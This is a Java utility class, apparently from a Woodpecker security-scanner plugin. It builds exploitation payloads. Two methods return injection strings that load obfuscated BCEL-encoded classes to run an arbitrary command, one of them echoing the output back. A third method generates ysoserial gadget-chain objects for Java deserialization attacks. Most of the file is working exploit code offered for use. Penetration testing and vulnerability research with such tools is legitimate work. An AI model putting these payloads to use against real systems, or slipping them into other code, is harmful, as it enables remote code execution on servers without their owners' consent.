package me.gv7.woodpecker.plugin.utils;

import ys.payloads.ObjectPayload;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class CommonUtil {
    public static String getVerifyCode(String command){
        return "new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8d$92$5bO$db$40$Q$85$cf$sNl$8c$5b$m$84$84$f4F$m$5cL$80F$e25$88$H$aaVE$8a$a0R$Q$So8$f6$S$W9$b6$b5Y$p$f8c$E5R$fb$de$lU1$9b$m$o$K$P$b5e$cf$ccj$cewfW$fb$e7$ef$cf_$Av$b1c$c3A$c5$c4$3b$T$efmdQ$b1$f0A$c7$8f$W$3e$d9XBU$X$cb62X1Q3$b1$ca$90$df$T$91P$fb$M$Ln$eb$ca$bb$f6$g$a1$Xu$hm$rE$d4mn$9e2$Y_$e2$803$cc$b4D$c4$8f$d2$5e$87$cb$T$af$T$d2J$a1$V$fb$5ex$eaI$a1$eb$c7EC$5d$8a$3e$83$d3$3a$3a$3c$fe$eeEA$c8e$93$n$eb$f7$C$zxa$c0$60$7f$bd$f1y$a2D$i$91$ccn$c7$a9$f4$f97$a1Q$ab$T$c4g$z$ac$5e$c8$b8W$3d$8c$92T$e9$86$e3$ce$V$f7$95$837Xc$98$9f$90$9fx$M$e5$7f$fd$OR$R$G$5c$d2$40$b5Z$cd$c1$3a6$Y$ac$b4O$G$81$90$s$5c$H$9b$a8$3b$d8$c2$b6$e6$be$a5$81$s30$ccNpcs$e2$b8$fa$88$f2$5e$92$f0$88v$b8$f3$da$Z$beXz$9c$a2$f9$8c$d8$be$ed$x$dec$98$eer$f5C$c6$J$97$ea$96a$fd$bf$80D$b2T$3c$ce$Z$8a$ee$x$jX$c64$dd$N$fd0zist$Jf$a8$3a$87A$Z$e0$d6$H$60Cd$ce$86$c8$9e$N$60$Urw$c8$X$cc$7bX$3a$ea$e2$OS$D$d8$bf$a97$83Y$fa$db$p$5d$8e$f4y$ccQV$gsP$c0$fc$c8$c7E$R$L$e4U$a2$dc$a0$98$a1$af$3cR$_$3e$A$90Gs$8a$b1$C$A$A\").getConstructor(new Class[]{String.class}).newInstance(new String[]{\"" + command.replaceAll("\"", "\\\"") + "\"});";
    }

    public static String getEchoExeCode(String command){
        return "new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dT$d9R$TA$U$3dM$96$Z$9aQ0$nh$c4$j$95$b0$84$b8$_$e0$c6$ea$WP$Z$E$e3$3e$9940Jf$e2dF$a5$caO$f0$dd$f2$LxQ$8b$w$ab$S$cb$94$fa$e6$83_$e2W$a8$b7C$d8$U$zg$aa$ba$fb$9e$db$7d$97so$f7$b7$l$l$3f$D8$8ci$F$dd$i$MI$F$3d$wR$i$87p$98$p$80$p$w$8e$ca$f9$98$8a$e3$wN$a88$a9$e2$U$c7i$f4$ca$a1O$c1$Z$Fg9$ce$e1$3cG$T$$p4$a2_$8a$D$K$G9bHJdH$ae$86U$8c$c8$f9$a2$82K$i$ad$b8$cc$b1$PI$VW8$f6$e2$aaD$d2$KF$V$8c1$E$5c$dff8$98H$3f2$9e$g$a99$c3$9eI$e9$9ek$d93$7d$j$7fB$M$c1A$t$t$Y$g$d3$96$z$c6$fc$7cV$b8$TFv$8e$90$f0$Z$cb$b6$bcs$M$b1$8dLM2$f0$e1$e7$a6$ux$96c$XI$d0$j$df5$c5$88$r$8fn$k$b3$i$dd1$l$L$afG$9ed$88V$N$f8$9e5$97$eaw$5dc$3em$V$3d$N$ed$b8$c6$d0$f4$bbm$G$c5$v$f6$d8F$5e$u$b8$ae$e1$G$f6k$Y$87N$89$3d$b3l$N$T$b8IK3$9fc$a8K$99$U$7f$d6$u$ce$d2$3ai$w$98$d40$85$5b$g2$b8$cd$d0R5l9$a9$B$7fzZ$b8$o7$$$8c$9cp$Z$e2$cb$8a$cbv$c1$f7$c8$a90$f2K$3a$Fw4$dc$c5$3d$Z$da$7d9$3c$d0$f0$Q$f7$Y$b6$fe$k$e4$80o$cd$d1$B$N$Gt$NYP$m$8ck$c8$c98$a3$ab$9bW$Y$d2$m$aa$v$b4$b5$b5ih$93$v$b5$p$c1P$bfB$d4$3a$o$aee$l$J$93$a0$40B$f2$bc$96$a1$f9$a2$t$f2$M$N3$c2$bb$ee$3a$F$e1z$f3$qyN$day$s$dcA$a3H$e47$t6$ac$b3j$3a$b6gX$b2V$adk$L$3a8k$b8$bax$e2$L$db$U$7d$j$c4$db$96U$dd$b8o$7bV$9elr$f2$b7$o$c4$d69$a8$c1$b2$93$c4sA$3c$q$Sw$fe$ddz$U$b8$v$8a$c5$beu$aej$m$f5$O$b9ZS$Y$e2$7e$d9$dd$fa$8a$d1$f1m$89$N$V$92$b3$e8$aaj$a9$b4UT$da$kv$5d$c7$5d$b6$ad$d2$94$93$9dO$edn$U$K$c2$a6$aeJ$fe$d7$cd$a95$80$q$d6s$96$hW$d24JY$Y3$82$ae$e5$5e$ba$a2$f2$ab$a3$97$81JN$e3$B$80$b5$o$E$95$d0$f7$V$b0L$ZuS$e1O$I$8cF$82$l$Q$w$n$iQJP_$a3$a9$3b$Q$a9$d7$bb$83$R$ae$_$60$T$J$NR$d0$f4$eeP$97$fe$81$80$S$5d$b1$K$g3$V4e$92$rl$v$pRF$b47$b8$Gk$aea$a1$Kb$e4$a7$a57$i$P$96$b05$d3$ab$7cE4$k$8e$93$a3m$918$NS$L$3f$bf$c7C$7fW$85K$d8$be8J$$w$yR$K$c0$h$bc$a5$e7$86$5e$YZ$8f$nJ$a3J$7f$3d6$81c$t$g$ui$N$9d$d8$8c$U$bd$5d$c7$Q$c1$v$das$B$cdtqc$98E$L$9e$m$8e$X$d8$8e$97$b4$fb$Vva$81$88zK$a7$de$RIL$5e$L$o$8c$88$c2$Q$RUGs$a2$b3$8c$9d$V$b4fj$89DvQd$9d$5d$r$ec$96aJ$81$C$yc$cf$X$da$bb$U$V$af$9ekG$90lu$d0$wH$b8$8c$b8$b3Z$8c$ae_$r$9c$ea7$b7$F$A$A\").getConstructor(new Class[]{String.class}).newInstance(new String[]{\"" + command.replaceAll("\"", "\\\"") + "\"});";
    }

    public static Object generator(String gadget,String command) throws Exception {
        // 解决: java.lang.RuntimeException: StubTransletPayload: frozen class (cannot edit) 错误
        try{
            javassist.ClassPool.getDefault().getCtClass("ys.payloads.util.Gadgets$StubTransletPayload").defrost();
        }catch (javassist.NotFoundException e){
            try {
                javassist.ClassPool.getDefault().getCtClass("StubTransletPayload").defrost();
            }catch (javassist.NotFoundException ee){}
        }

        Class<? extends ObjectPayload> clsGadget = ObjectPayload.Utils.getPayloadClass(gadget);
        if(clsGadget == null){
            throw new Exception("Gadget payload is null");
        }
        ObjectPayload<?> payload = clsGadget.newInstance();

        Object objPaylad = payload.getObject(command);
        return objPaylad;
    }

    public static Map<String,Object> parseURL(String url){
        Map<String, Object> res = new HashMap<String, Object>();
        try {
            URL targetURL = new URL(url);

            res.put("host", targetURL.getHost());
            Integer port = targetURL.getPort();

            if (port == -1) {
                if(url.startsWith("https://")){
                    port = 443;
                }else{
                    port = 80;
                }
            }
            res.put("port", port);
            res.put("protocol",targetURL.getProtocol());
            if(targetURL.getFile().equals("/")){
                res.put("rooturl",targetURL.toString());
            }else{
                res.put("rooturl",targetURL.toString().replace(targetURL.getFile(),""));
            }

        }catch (MalformedURLException e){
            e.printStackTrace();
            String[] strs = url.split(":|/");
            res.put("protocol",strs[0]);
            res.put("host",strs[3]);
            res.put("port", strs[4]);
        }
        return res;
    }



    public static void main(String[] args) {
        parseURL("tcp://127.0.0.1:8080/xsd");
    }
}
